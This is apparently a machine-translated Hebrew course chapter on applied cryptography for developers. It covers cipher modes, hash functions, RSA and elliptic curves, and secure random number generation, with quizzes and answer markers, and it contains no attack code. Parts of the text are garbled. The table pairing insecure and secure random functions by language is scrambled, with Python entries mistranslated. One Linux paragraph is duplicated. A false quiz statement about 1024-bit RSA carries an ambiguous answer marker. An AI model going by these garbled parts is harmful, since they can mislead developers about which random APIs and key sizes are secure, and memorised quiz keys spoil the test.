מבחינה היסטורית  נעשה שימוש במצב *שרשרת בלוקים של צופן* (CBC), אך יש לחשב זאת ברצף, ולכן הוא איטי במערכות מרובות ליבות. בעיה נוספת היא שמערכות רבות המשתמשות ב-CBC פגיעות להתקפות, אלא אם כן הן נבדקות תחילה על ידי תקינות. אז באופן כללי, עדיף להימנע מצב CBC היום ([Microsoft CBC תיעוד](https://docs.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode), 2020).

מצב נפוץ המשמש כיום הוא מצב Galois/Counter (GCM). הוא מהיר, ניתן להקבלה ומוסיף קוד אימות כך שהוא יכול לזהות בקלות אם נעשה שימוש במפתח הלא נכון. זהו מצב טוב לשימוש. יש גם מצבים טובים אחרים; הדבר החשוב הוא לבחור מצב בחוכמה, ובמיוחד, *לעולם לא* להשתמש במצב ECB במערכות ייצור.

#### חידון 3.1: אלגוריתמים סימטריים/משותפים להצפנת מפתח

\>\>בחר את המשפטים הנכונים:<<

[!x] תקן ההצפנה המתקדם (AES) תומך בשלושה גדלי מפתחות: 128, 192 או 256 סיביות.

[ ] Triple-DES (3DES) הוא אלגוריתם הצפנה מאובטח לשימוש עבור כמויות גדולות של נתונים. {{ נבחר: זה לא נכון. ל-3DES יש גודל בלוק פנימי של 64 סיביות בלבד, וזה הופך אותו לפגיע ל"התקפת יום הולדת" אם כמויות משמעותיות של נתונים מוצפנות עם אותו מפתח. 3DES הוא הרבה יותר טוב מאשר DES בפני עצמו, שכן 3DES יש גודל מפתח ארוך יותר, אבל אתה צריך בדרך כלל להשתמש במשהו אחר כמו AES שבו אתה יכול. }}

[ ] עליך להשתמש במצב ספר הקודים האלקטרוני (ECB) של אלגוריתמי הצפנה, מכיוון שהדבר מאפשר שכפול.

[x] מצב נפוץ ובדרך כלל טוב לבחירה הוא Galois/Counter Mode (GCM).

### קודי Hash קריפטוגרפיים (טביעות אצבע דיגיטליות)

תוכניות מסוימות זקוקות לאלגוריתם גיבוב קריפטוגרפי חד-כיווני, כלומר, פונקציה שלוקחת  כמות *שרירותית* של נתונים ומייצרת מספר באורך קבוע עם תכונות מיוחדות. המאפיינים המיוחדים הם שזה חייב להיות בלתי אפשרי עבור תוקף ליצור:

1. הודעה נוספת עם ערך גיבוב נתון (*התנגדות קדם-תמונה*)

2. הודעה נוספת (ששונתה) עם אותו גיבוב כמו ההודעה הראשונה (*התנגדות קדם-תמונה שנייה*)

3. כל שתי הודעות עם אותו גיבוב (*התנגדות להתנגשות*).

הרעיון הוא שאתה יכול לייצג כמות שרירותית של נתונים עם ערך קטן יותר של אורך קבוע. הם "*חד-כיווניים*" במובן זה שבדרך כלל לא ניתן לשחזר את הנתונים המקוריים בהינתן ערך הגיבוב בלבד. קודי Hash קריפטוגרפיים שימושיים בפני עצמם, והם משמשים לעתים קרובות גם כחלק ממערכות הצפנה גדולות יותר.

כדאי להימנע מהאלגוריתמים MD4, MD5 ו-SHA-0, שכן ידוע שהם שבורים.

משפחת SHA-2 (כולל SHA-256 ו- SHA-512) והאלגוריתם SHA-3 נמצאים בשימוש נרחב ונחשבים בדרך כלל מאובטחים בזמן כתיבת שורות אלה. היו חששות לגבי משפחת SHA-2, מה שהוביל לפיתוח של SHA-3, אך נכון לכתיבת שורות אלה לא דווח בפומבי על הפסקה מלאה של SHA-2.

אלגוריתם SHA-1 הוא מקרה קצת יותר מסובך. אתה לא צריך להשתמש בו במערכות חדשות, וצריך להתרחק ממנו מיד אם אתה משתמש בו כרגע. NIST הוציאה את SHA-1 משימוש בשנת 2011 מכיוון שהוא שבור ביסודו, במובן זה ש- SHA-1 כבר לא עונה על ההגדרה של גיבוב קריפטוגרפי. ברוב המקרים, אין בעיה לעבור מ- SHA-1 ל- SHA-2 או SHA-3.

עם זאת, בעיה מעצבנת אחת היא שכלי ה- git הנפוץ (כפי שפותח במקור) תלוי ביסודו ב- SHA-1. ההפסקות הידועות כיום ב- SHA-1 אינן חשובות במצבים נפוצים. בנוסף, נכון לשנת 2020, git משתמש בגרסה מוקשחת של SHA-1 המתמודדת עם הבעיות העיקריות עם SHA-1 כפי שהוא משמש בתוך git. עם זאת, ההתקפות רק מתחזקות, לא חלשות יותר, מה שמוביל לחששות רבים לגבי השימוש ב-SHA-1 ב-git.

נכון לכתיבת שורות אלה, יש מאמץ לעדכן את git כך שיתמוך באלגוריתם גיבוב קריפטוגרפי אחר, במיוחד SHA-256. זה היה מסובך מכיוון ש-git לא תוכנן במקור לתמוך באלגוריתם גיבוב קריפטוגרפי אחר ([אלגוריתם גיבוב חדש עבור Git](https://lwn.net/Articles/811068/), מאת ג'ונתן קורבט, 2020). כפי שצוין LWN.net, *"אחת הסיבות שהמעבר הזה היה כל כך קשה היא שיישום Git המקורי לא תוכנן להחליף אלגוריתמי hashing. חלק גדול מהעבודה היה [הטמעת SHA-256 ב-git] להחזיר את פגם העיצוב הראשוני הזה [כדי ליצור] Git אדיש ביסודו לאלגוריתם הגיבוב שבו נעשה שימוש. זה [עבודה] אמור להפוך את Git לניתן יותר להתאמה בעתיד אם יתעורר הצורך להחליף את SHA-256 במשהו חזק יותר" (עדכון פרוטוקול Git עבור SHA-256*[, מאת ג'ון קוגשל, 2020).](https://lwn.net/Articles/823352/)

זה עשוי להיפתר ב- git עד שתקרא את זה. עם זאת, הנקודה העיקרית היא ללמוד מטעות זו. כפי שצוין קודם לכן, מערכות הצפנה (כגון אלגוריתמים ופרוטוקולים) *נשברות* מדי פעם, ולכן עליך להיות מוכן להחליף אותן.

#### חידון 3.2: קודי Hash קריפטוגרפיים (טביעות אצבע דיגיטליות)

\>\>בחר את המשפטים הנכונים:<<

[!x] באלגוריתם גיבוב קריפטוגרפי חד-כיווני מאובטח, זה צריך להיות בלתי אפשרי, בהינתן הודעה אחת, ליצור הודעה אחרת בעלת אותו ערך גיבוב {{ נבחר: זה נכון, זוהי "התנגדות preimage" }}

[x] SHA-1 כבר לא עומד בקריטריונים המלאים לפונקציית גיבוב קריפטוגרפית חד-כיוונית, כך שבאופן כללי עליך לעבור לאלגוריתם אחר, כגון משפחת SHA-2 או SHA-3.

[x] פונקציית גיבוב קריפטוגרפית מקבלת כמות שרירותית של נתונים ומפיקה ערך באורך קבוע המייצג את נתוני הקלט.

### קריפטוגרפיה של מפתח ציבורי (אסימטרי)

מפתח ציבורי או מערכת הצפנה אסימטרית משתמשים בזוגות מפתחות. מפתח אחד  הוא מפתח *פרטי* (ידוע רק לבעליו) והשני הוא *מפתח ציבורי* (הניתן להפצה ציבורית). המפתחות קשורים זה לזה אך ממלאים תפקידים שונים, ולכן אלה נקראים לעתים קרובות *קריפטוגרפיה אסימטרית*. חיוני במערכות אלה לשמור על המפתח הפרטי פרטי.

ניתן להשתמש באלגוריתמים אלה בדרך אחת או יותר (בהתאם לאלגוריתם), כולל:

* **הצפנה**<br>כל אחד יכול להצפין הודעה באמצעות מפתח ציבורי, אך רק מישהו עם המפתח הפרטי המתאים יכול לפענח אותה. אלגוריתמים של הצפנת מפתח ציבורי הם בדרך כלל איטיים יחסית, כך שבמצבים רבים**, מפתח  עבור אלגוריתם מפתח משותף מוצפן, ושאר ההודעה מוצפנת באמצעות מפתח משותף.

* **חתימות דיגיטליות (אימות)**<br>שולח יכול להשתמש באלגוריתם מפתח ציבורי ובמפתח הפרטי שלו כדי לספק נתונים נוספים הנקראים *חתימה דיגיטלית*; כל מי שיש לו את המפתח הציבורי יכול לוודא שהשולח מחזיק במפתח הפרטי המתאים.

* **חילופי מפתחות**<br>ישנם אלגוריתמים של מפתח ציבורי המאפשרים לשני צדדים להגיע בסופו של דבר למפתח משותף מבלי שמשקיפים פסיביים חיצוניים יוכלו לקבוע את המפתח.

אלגוריתם מפתח ציבורי נפוץ הוא אלגוריתם RSA, אשר *ניתן* להשתמש בו לכל המטרות הללו. עם זאת, *אל תיישם RSA בעצמך*. RSA מבוסס ביסודו על אקספוננציה של מספרים גדולים, אשר מפתה כמה מפתחים ליישם את זה בעצמם או לחשוב שזה פשוט. בפועל קל מאוד ליישם RSA *בצורה לא מאובטחת*. לדוגמה, קשה מאוד לבדוק פרמטרים חלשים שנראים ** מקובלים אך הופכים את זה לטריוויאלי להביס. כדי להיות מאובטח, RSA *חייב* להיות מיושם עם משהו שנקרא "ריפוד". יש ערכת ריפוד RSA סטנדרטית עם הוכחה קפדנית בשם OAEP, אך קשה ליישם אותה כראוי (יישומים שגויים עלולים להיות פגיעים להתקפה *של מאנגר*). בפועל, RSA יכול להיות מסובך ליישום נכון, ואם לא תבינו קריפטוגרפיה, לא תוכלו לדעת מתי היא לא עובדת ([*ברצינות, הפסיקו להשתמש ב-RSA,*](https://blog.trailofbits.com/2019/07/08/fuck-rsa/) 2019).

אורכי מפתחות RSA צריכים להיות ארוכים מכפי שניתן לצפות. אורך מפתח RSA של 1024 סיביות שווה בערך לאורך מפתח סימטרי של 80 סיביות, שהוא כה קטן עד שהוא נחשב בדרך כלל לא בטוח. אורך מפתח RSA של 2048 סיביות שווה ערך לאורך מפתח סימטרי של 112 סיביות; סיבית 2048 נחשבת בקושי מקובלת על ידי חלקם (למשל, NIST אומר כי ניתן להשתמש בה עד 2030, ולאחר מכן ייתכן שממשלת ארה"ב לא תשתמש בה). אם אתה משתמש ב- RSA, סביר להניח שעליך להשתמש במפתח של 3,072 סיביות לפחות בפריסות הנוכחיות (זה שווה ערך למפתח סימטרי של 128 סיביות). תזדקק למפתח RSA של 15,360 סיביות כדי לקבל את המקבילה של מפתח סימטרי של 256 סיביות. ראה  את ההמלצה [של NIST *לניהול מפתחות: חלק 1 - כללי*](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-57pt1r5.pdf) לקבלת מידע נוסף על אורכים שווי ערך למפתח. למרבה הצער, RSA הוא איטי יחסית, במיוחד ככל שאתה מגדיל את אורכי המפתח הדרושים לאבטחה מינימלית. מכל הסיבות הללו, ארגונים מסוימים, כגון Trail of Bits, ממליצים להימנע משימוש ב- RSA ברוב המקרים ([*ברצינות, הפסק להשתמש ב- RSA,*](https://blog.trailofbits.com/2019/07/08/fuck-rsa/) 2019).

משפחה שלמה  של אלגוריתמים נקראת *קריפטוגרפיה של עקומה* אליפטית; אלה הם אלגוריתמים המבוססים על מתמטיקה מורכבת הכוללת עקומות אליפטיות. אלגוריתמים אלה דורשים אורכי מפתח קצרים בהרבה עבור חוזק קריפטוגרפי שווה ערך, וזהו יתרון משמעותי. מבחינה היסטורית, קריפטוגרפיה של עקומה אליפטית כללה שדה מוקשים של פטנטים, אך עם השנים רבים מהפטנטים הללו פג ולכן קריפטוגרפיה של עקומה אליפטית הפכה נפוצה יותר. אלגוריתם נפוץ ומכובד להחלפת מפתחות וחתימות דיגיטליות הוא Curve25519; פרוטוקול קשור בשם ECIES משלב חילופי מפתחות Curve25519 עם אלגוריתם מפתח סימטרי (לפרטים נוספים, ראה [*ברצינות, הפסק להשתמש ב- RSA,*](https://blog.trailofbits.com/2019/07/08/fuck-rsa/) 2019).

תקן החתימה הדיגיטלית (DSS) הוא תקן ליצירת חתימות דיגיטליות קריפטוגרפיות. הוא תומך במספר אלגוריתמים בסיסיים: אלגוריתם חתימה דיגיטלית (DSA), אלגוריתם החתימה הדיגיטלית RSA ואלגוריתם החתימה הדיגיטלית של העקומה האליפטית (ECDSA).

יש גם מגוון של אלגוריתמים חילופי מפתח. הוותיק ביותר הוא אלגוריתם חילופי המפתחות של דיפי-הלמן. קיים אלגוריתם חילופי מפתחות חדש יותר המבוסס על עקומות אליפטיות, הנקרא עקומה אליפטית דיפי-הלמן (ECDH).

כפי שנרמז קודם לכן, חשוב מאוד להשתמש ביישומים קיימים ומכובדים (אל תיישמו אותם בעצמכם), ולבדוק היטב את כל הפרמטרים שתבחרו. אולי החשוב ביותר הוא אורך המפתח עבור אלגוריתם זה (כפי שצוין קודם לכן, אלגוריתמים של עקומה אליפטית הם בעלי חוזק שווה ערך עם מפתחות קצרים יותר). מקור שימושי לאורכי מפתח מומלצים הוא  ההמלצה [של NIST *לניהול מפתח: חלק 1 - כללי*](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-57pt1r5.pdf).

#### חידון 3.3: מפתח ציבורי (אסימטרי) קריפטוגרפיה

\>\>בחר את המשפטים הנכונים:<<

[!] RSA עם מפתח של 1024 סיביות נחשב בדרך כלל למאובטח מספיק עבור רוב מקרי השימוש.

[ ] RSA הוא בעצם אקספוננציה, ולכן כדי להגביל תלות עדיף לעתים קרובות ליישם אותו מחדש בתוך מערכת גדולה יותר.

[x] Curve25519 הוא אלגוריתם נפוץ שנחשב בדרך כלל למאובטח.

### מחולל מספרים פסאודו-אקראיים מאובטח באופן קריפטוגרפי (CSPRNG)

אלגוריתמים רבים תלויים בערכים סודיים שאינם ניתנים לניחוש מעשי על ידי תוקף, המכונה "מאובטח מבחינה קריפטוגרפית". זה כולל ערכים המשמשים אלגוריתמים של קריפטוגרפיה (כגון מפתחות פרטיים ו- nonces), מזהי הפעלה וערכים רבים אחרים. אם תוקף יכול לנחש ערך, כולל ערכי עבר או עתיד, מערכות רבות הופכות לחסרות ביטחון.

אתגר אחד הוא היסטורי: כיום, השם *אקראי* בספריות שפות תכנות בדרך כלל מרמז על כך שהפונקציה *אינה* מאובטחת מבחינה קריפטוגרפית. אחד השימושים הראשונים במחשבים דיגיטליים היה ליישם סימולציות (במיוחד *סימולציות מונטה קרלו)* שבהן מספרים אקראיים נרכשו שוב ושוב לסימולציה. לעתים קרובות היה חשוב להיות מסוגלים *לשחזר* את  המספרים האקראיים האלה כדי שניתן יהיה לחזור על ניסויים. באופן פנימי, פונקציות אקראיות כאלה ייושמו באמצעות אלגוריתמים כגון מחולל ליניארי קונגרואנטיאלי (LCG), ולעתים קרובות "ייזרעו" (יאותחלו) על ידי ערכים כגון תאריך/שעה הניתנים לניחוש טריוויאלי על ידי תוקף. מכיוון שזה היה אחד השימושים הראשונים במחשבים, קיימת מוסכמה כמעט בכל שפות התכנות שהמילה "אקראי" מתייחסת לדרך ליצור רצף של מספרים שניתן לשחזר בקלות מאוחר יותר במידת הצורך. במילים אחרות, המילה "אקראי" בשפות תכנות מרמזת בדרך כלל על "אקראי *באופן צפוי*", וזה לא מה שאתה רוצה בקריפטוגרפיה או באבטחה. אין ** להשתמש במספרים אקראיים כאלה עבור מנגנוני אבטחה שבהם חשוב שהתוקף *לא* יוכל לקבוע את המספר.

![באיור זה getRandomNumber מיושם על ידי החזרת הקבוע 4, מספר שנבחר על ידי גליל קוביות הוגן ונטען כי מובטח שהוא אקראי.](random_number.png)

**מספר אקראי**, שאוחזר מתוך [xkcd.com](https://xkcd.com/221), מורשה תחת [CC-BY-NC-2.5](https://creativecommons.org/licenses/by-nc/2.5/)

במקום זאת, עבור קריפטוגרפיה ומשימות הקשורות לאבטחה, עליך להשתמש [במחולל מספרים פסאודו-אקראיים מאובטח באופן קריפטוגרפי (CSPRNG)](https://en.wikipedia.org/wiki/Cryptographically-secure_pseudorandom_number_generator) עבור משימות הקשורות לקריפטו ולאבטחה. במילים אחרות, ישנם אלגוריתמים ויישומים רבים של מחולל מספרים פסאודו-אקראיים (PRNG), אך לצורך אבטחה, עליך  להשתמש *רק* ב- PRNGs שהם PRNGs מאובטחים באופן קריפטוגרפי (CSPRNGs). CSPRNG טוב מונע למעשה לחזות את הפלט הבא בהינתן תפוקות עבר (בסיכוי גדול מאקראי) והוא גם מונע חשיפת תפוקות עבר אם מצבו הפנימי נפגע. CSPRNGs נקראים גם PRNGs קריפטוגרפיים (CPRNGs). בדרך כלל שם של יישום CSPRNG יכלול "מאובטח" ו/או "קריפטו". בתיעוד שלהם, אתה עשוי לראות הפניות לאלגוריתמים CSPRNG מקובלים היטב כגון Yarrow, Fortuna, ANSI X9.17 (שיכול להשתמש בכל צופן בלוקים), NIST SP 800-90A של Hash_DRBG, HMAC_DRBG ו- CTR_DRBG.

** לעולם אל תשתמש באלגוריתם Dual_EC_DRBG, שכן מקובל שמדובר באלגוריתם חתרני וחסר ביטחון.**

הנה כמה דוגמאות כיצד לקרוא ל- PRNG הצפוי לעומת PRNG מאובטח קריפטוגרפית בשפות תכנות שונות (בפועל יש לעתים קרובות מספר דרכים; הנקודה היא להראות שהן שונות):

<table>
  <tr>
    <td>שפה</td>
    <td> ערך אקראי צפוי(אין להשתמש באבטחה<br>)ערך</td>
  <td>
    </td>
  </tr> אקראי מאובטח באופן קריפטוגרפי<tr>Java<td>
     Random()</td>SecureRandom()<td>
    </td><td>
  </td>
    </tr>
  <tr>
    <td>C#</td>
    <td>System.Random</td>
    <td>System.Security.Cryptography. RandomNumberGenerator</td>
  </tr>
  <tr>
    <td>JavaScript</td>
    <td>Math.random window.crypto.getRandomValues</td>או crypto.randomBytes<td>Python<br>
    </td>
  </tr>
  <tr>
    <td>מערכת הפעלה אקראית.אקראית</td><td>
    </td><td>
    </td>
  </tr>
</table>


אתגר נוסף הוא שתוכנה היא דטרמיניסטית ביסודה; בהינתן אותן כניסות בדיוק, אלגוריתם רציף אמור להפיק בדיוק את אותו פלט. בדרך כלל אין לזרוע (לאתחל) אלגוריתמים מאובטחים באופן קריפטוגרפי, מכיוון שרבות מספריות אלה מיישמות זריעה מאובטחת בעצמן. אם אתה חייב לזרוע אותו (וזה סימן רע), ודא שהתוקפים לא יכולים לנחש את ערך הזרע. יש אנשים שזורעים אלגוריתמי PRNGs מאובטחים באופן קריפטוגרפי עם נתוני תאריך/שעה, וזו נקודת תורפה; במקרים רבים, התוקפים יכולים לנחש בקלות את התאריך/שעות האפשריים.

יש פתרון פשוט: להשתמש CSPRNG ולהשתמש בחומרה כדי לספק נתונים כראוי אליו. רוב ליבות מערכות ההפעלה כיום מספקות מספרים אקראיים מאובטחים באופן קריפטוגרפי על ידי איסוף רעשי סביבה מהתקני חומרה מרובים והטמעת CSPRNG. אם אתה פועל על מתכת חשופה (במקום ליבה של מערכת הפעלה) יש בדרך כלל ספריות לשימוש חוזר שתוכל להשתמש בהן למטרה זו. ניתן להשתמש במספרים אקראיים מאובטחים קריפטוגרפיים אלה ישירות, או לשמש כזרע מאובטח עבור PRNG מאובטח מבחינה קריפטוגרפית.

לדוגמה, ליבת לינוקס מספקת ערכי מספרים אקראיים מאובטחים באופן קריפטוגרפי באמצעות `getrandom` קריאת המערכת שלה, כמו גם את הקבצים המיוחדים `/dev/urandom` ו`/dev/random`- . ברוב המקרים תרצה להשתמש `getrandom` בקריאת המערכת כאשר היא מעשית, או בקובץ המיוחד `/dev/urandom` אם `getrandom` קשה לגשת אליו (למשל, מתוך סקריפט מעטפת). אלה יוצרים ערכים אקראיים מאובטחים באופן קריפטוגרפי באמצעות CSPRNG ואנטרופיה שנאספו על ידי הליבה. בנסיבות מיוחדות, כגון יצירת מפתח הצפנה בעל תוחלת חיים ארוכה, ייתכן שתרצה להשתמש במקום זאת  או `/dev/random` באפשרות המקבילה ב`getrandom`- ; פעולה זו מאלצת את הליבה להמתין (לחסום) עד שתהיה לה כמות משוערת גבוהה של אנטרופיה פנימית. המטרה `/dev/random` של  היא להבטיח שיש כמות גדולה של אנטרופיה פנימית, אבל החסימה עשויה להיות בלתי מוגבלת בנסיבות מסוימות וזה בדרך כלל לא הכרחי. מה שחשוב הוא שהתוקף לא יכול לנחש באופן מעשי את הערך האקראי, ולא את הערך של הערכת האנטרופיה הפנימית הזו. (ראה  ["מיתוסים על /dev/urandom"](https://www.2uo.de/myths-about-urandom/) מאת תומאס). בעתיד ייתכן שלא יהיה הבדל בין `/dev/random` לבין `/dev/urandom`.

לדוגמה, ליבת לינוקס מספקת ערכי מספרים אקראיים מאובטחים באופן קריפטוגרפי באמצעות  הקובץ המיוחד /dev/urandom ** , הקובץ המיוחד ** /dev/random** שלה  וקריאת ** המערכת getrandom** שלה ** . ברוב המקרים תרצה להשתמש  בקובץ המיוחד /**dev/urandom** או בקריאת  המערכת **getrandom**. אלה יוצרים ערכים אקראיים מאובטחים באופן קריפטוגרפי באמצעות CSPRNG ואנטרופיה שנאספו על ידי הליבה. בנסיבות מיוחדות, כגון יצירת מפתח הצפנה בעל תוחלת חיים ארוכה, ייתכן שתרצה במקום זאת להשתמש  ב**- /dev/random** או באפשרות המקבילה ב- **getrandom**; פעולה זו מאלצת את הליבה להמתין (לחסום) עד שתהיה לה כמות משוערת גבוהה של אנטרופיה פנימית. המטרה של  /**dev/random** היא לוודא שיש אנטרופיה פנימית, אך החסימה עשויה להיות בלתי מוגבלת בנסיבות מסוימות ובדרך כלל אין בה צורך

בעיית אבטחה מגעילה במיוחד במערכות מחשב היא *מחוללי מספרים אקראיים לא מאובטחים*. מחולל מספרים אקראיים לא מאובטח מייצר ערכים שנראים בסדר, אך הורס את האבטחה של המערכת כולה. כשלים רבים במערכות קריפטוגרפיות נקשרו ליצירת מספרים אקראיים גרועים, בין השאר משום שקשה לזהות את הבעיה.

במקרים רבים שימוש במחוללי מספרים אקראיים לא מאובטחים הוא טעות לא מכוונת, אך במקרים מסוימים ארגונים  חותרים *במכוון* תחת מחוללי מספרים אקראיים. לדוגמה, בשנת 2020 נחשף כי ה-CIA האמריקאי, בשיתוף עם המודיעין של מערב גרמניה, היה הבעלים של חברת Crypto AG ומכר באופן נרחב מוצרים קריפטוגרפיים שעברו חתירה תחת מכוון, לפחות בחלק מהמקרים על ידי חבלה באופן שבו היא יצרה ערכים "אקראיים". ראה [את ההפיכה המודיעינית של המאה](https://www.washingtonpost.com/graphics/2020/world/national-security/cia-crypto-encryption-machines-espionage/) על ידי גרג מילר למידע נוסף.

יצירת מספרים אקראיים לא מאובטחים היא בעיה חמורה במיוחד בתוכנת מכשיר האינטרנט של הדברים (IoT). דו"ח אחד משנת 2021 מצא כי לכ-35 מיליארד מכשירי IoT היו פגיעויות אבטחה הרסניות עקב יצירת מספרים אקראיים קריפטוגרפיים לא מאובטחים. זאת בין השאר משום שמפתחי תוכנת IoT רבים מכנים ישירות מחוללי מספרים אקראיים בחומרה (הם לא אמורים לעשות זאת), אך גרוע מכך, הם התעלמו מקודי החזרת שגיאות מאותם גנרטורים (והם בהחלט לא צריכים לעשות זאת). למחוללי מספרים אקראיים בחומרה יש בדרך כלל קצבי ייצור חריגה בקלות, כך שהם יכולים ליצור מספרים אקראיים במהירויות מוגבלות בלבד. אם משתמשים קוראים מהר מדי, סביר להניח שהמחולל ידווח על שגיאות. עם זאת, רק לשים לב לקוד השגיאה מהחומרה זה לא ממש מספיק.  חומרה לפעמים נכשלת, ואם התוכנה פשוט נתקעת במקרה זה, מכשיר ה- IoT עשוי להיות לא אמין מכדי להתחרות. קוד לדוגמה לגישה לחומרת מחולל המספרים האקראיים הוא לעתים קרובות לא מאובטח (הוא מראה כיצד לקבל נתונים, אך לא כיצד להשתמש בהם כראוי). שימוש נכון בחומרה ישירות יכול להיות די קשה, למשל, LPC 54628 של דף מדריך למשתמש מספר 1,106 (מתוך 1,152) מציין, בצורה מפותלת, כי לאחר קריאת מספר אקראי מהחומרה שלה אתה חייב לקרוא ולזרוק את 32 הערכים הבאים. אותו מחקר מראה גם כי מחוללי מספרים אקראיים של חומרה ממעבדים פופולריים המשמשים במוצרי IoT אינם מייצרים נתונים אקראיים לחלוטין. אפשר להשתמש במבחן אקראיות כדי לוודא אם המספרים שנוצרו הם אכן אקראיים.

מפתחי תוכנה עבור מכשירי IoT לא צריכים לגשת ישירות לאוגרי החומרה, אלא במקום זאת לקרוא למחוללי CSPRNG מעוצבים היטב המשתמשים נכון במקורות חומרה (רצוי מקורות מרובים) כקלטים למאגר האנטרופיה הפנימי שלהם. ברוב המקרים מפתחי IoT צריכים להשתמש במערכת הפעלה IoT הכוללת יישום CSPRG שנזרע כראוי ממקורות חומרה מרובים, ופשוט לבדוק אם נראה שהוא נכתב בקפידה לאבטחה. כאשר זה לא מעשי, השתמש בספריית CSPRNG מעוצבת ומנותחת היטב הכוללת תוכנה נכונה כדי לחלץ ערכים אקראיים מהחומרה שלך; אל תיישם קריפטו משלך אלא אם כן אתה מומחה בקריפטוגרפיה. מפתחי תוכנת IoT צריכים גם להריץ בדיקות סטטיסטיות על מנגנון יצירת המספרים האקראיים שלהם כדי להבטיח שהם אקראיים, מכיוון שזו בעיה נפוצה במיוחד במכשירי IoT. לקבלת פרטים נוספים, ראה [אתה עושה IoT RNG](https://labs.bishopfox.com/tech-blog/youre-doing-iot-rng) ([מצגת](https://www.youtube.com/watch?v=Zuqw0-jZh9Y)) מאת דן פטרו ואלן ססיל, מצגת DEF CON 2021.

לסיכום: הקפד להשתמש במחולל חזק ומאובטח מבחינה קריפטוגרפית של מספרים אקראיים פסאודו-אקראיים (CSPRNG), שנזרע עם ערכי חומרה מרובים, בכל פעם שאתה זקוק לערך שהיריב אינו יכול לחזות. עליך לחפש פונקציה שאומרת שהיא מחולל מספרים אקראיים "מאובטח" או "קריפטוגרפי". אל תשתמש במחולל מספרים "אקראי" רגיל, כגון כל דבר המתועד כשימוש במחולל ליניארי (LCG), למטרות אלה.

>  שעת סיפור: מפתחות פגיעים שנוצרו על ידי OpenSSL של דביאן / אובונטו

> בשנת 2006 דביאן לינוקס ביצעה שינוי בגרסתה לספריית ההצפנה OpenSSL הנפוצה כדי לנסות להסיר אזהרה. עם זאת, השינוי נעשה על ידי מישהו שאינו בקיא בקריפטוגרפיה וחתר שלא במתכוון תחת מחולל המספרים האקראיים של OpenSSL עבור מפתחות בדביאן. היה ניסיון קצר לתקשר עם מפתחי ספריית OpenSSL במעלה הזרם, אך לא היה ניסיון להציע את השינוי בחזרה לפרויקט OpenSSL כדי שפרויקט OpenSSL יוכל לוודא שהשינוי אינו מזיק. משמעות הדבר היא שכל המפתחות שנוצרו באמצעות OpenSSL על ידי דביאן, כמו גם אובונטו (המבוססת על דביאן), לא היו מאובטחים עד שנמצאה הפרצה בשנת 2008. זה כלל מפתחות OpenSSH שנוצרו על ידי קריאה ל- OpenSSL. פגיעות זו קיבלה את המזהה [CVE-2008-0166](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0166). שבע שנים לאחר מכן, בן קוקס דיווח כי מספר רב של מפתחות פגיעים שנוצרו מטעות זו עדיין היו בשימוש ולחלקם הייתה שליטה על מאגרי GitHub חשובים. אלה כללו מאגרים של ספוטיפיי, יאנדקס, ספריות ההצפנה של פייתון והליבה של פייתון. (בן קוקס, " [ביקורת על איכות מפתח ה-SSH של משתמשי GitHub](https://blog.benjojo.co.uk/post/auditing-github-users-keys)", 2015). דוגמה זו מראה עד כמה ערכים אקראיים מאובטחים באופן קריפטוגרפי יכולים להיות חשובים.

אם אתה זקוק למספר אקראי קריפטוגרפי בטווח
(לדוגמה, מספר שלם מ- 0 למספר N),
אל תשתמש **** רק באופרטורים מודולוס או שארית.
מתכנתים רבים *חושבים* בטעות  שזה בסדר להשתמש ישירות ב
אופרטורים מודולוס או שארית (למשל, או `%` `mod` בשפות רבות)
למטרה זו.
עם זאת, לעתים קרובות זה גורם למספרים מסוימים להיות בסבירות גבוהה יותר מאחרים,
בעיה שנקראת *הטיית מודולו.*
הטיית מודולו יכולה לפעמים להוביל לניצול המערכת.
(יולן רומיילר,
[*המדריך הסופי ל"הטיית מודולו וכיצד להימנע ממנה"! *](https://research.kudelskisecurity.com/2020/07/28/the-definitive-guide-to-modulo-bias-and-how-to-avoid-it/))

אם אתה זקוק למספר אקראי קריפטוגרפי בטווח, אל תשתמש במודולוס
או אופרטורים שנותרו ישירות - במקום זאת, השתמש באופרטורים קיימים
פונקציה המספקת  מספרים אקראיים *קריפטוגרפיים בלתי משוחדים* בטווח.
רוב ספריות CSPRNG מספקות פונקציה זו - רק בדוק שהיא אינה משוחדת.
אם אתה חייב ליישם את זה בעצמך, ישנן שיטות שונות כגון
כדגימת דחייה,
[מספרים אקראיים כמעט ללא חלוקה לפי האלגוריתם של דניאל למיר](https://dotat.at/@/2020-10-29-nearly-divisionless-random-numbers.html), או
[מספרים אקראיים ללא חלוקה לפי סטיב קנון וקנדל ווילטס](https://dotat.at/@/2022-04-20-really-divisionless.html).
עם זאת, בדרך כלל עליך פשוט להשתמש בפונקציית ספריית CSPRNG
המספק פונקציה זו.

#### חידון 3.4: מחולל מספרים פסאודו-אקראיים מאובטח באופן קריפטוגרפי (CSPRNG)

\>\>בחר את המשפטים הנכונים:<<

[!x] בשפות תכנות רבות, מחולל מספרים פסאודו-אקראיים מאובטח באופן קריפטוגרפי יכלול "מאובטח" או "קריפטו" בשמו.

[x] בשפות תכנות רבות, פונקציה/שיטה עם השם "אקראי" אך ללא מחוון אחר היא בדרך כלל מספר אקראי צפוי ואין להשתמש בה לצורך אבטחה.

[ ] קל לדעת אם PRNG קריפטוגרפי הוא חתרני.

### אחסון סיסמאות

צורך נפוץ הוא שאתה מטמיע שירות ו/או יישום שרת, ועליך לאמת ו/או להוכיח שהמשתמש מורשה להגיש בקשה. פעולה זו נקראת *אימות נכנס*. להלן שלוש גישות נפוצות לביצוע פעולה זו:

1. האצילו את הקביעה הזו לשירות אחר. אתה צריך לסמוך על שירות אחר זה, ואתה צריך מפרט כדי לתקשר את זה. OAUTH ו- OpenID הם שני מפרטים נפוצים לביצוע הבקשה לשירות האחר. באופן כללי, הייתם קוראים לשגרה כדי ליישם זאת; הקפד ליישם את הנחיות האבטחה שלו. זה יכול להיות נוח למשתמשים, אבל זכור שזה חושף כל כניסה לשירות חיצוני זה (חשש לפרטיות), וודא שאתה יכול לסמוך על שירות זה.

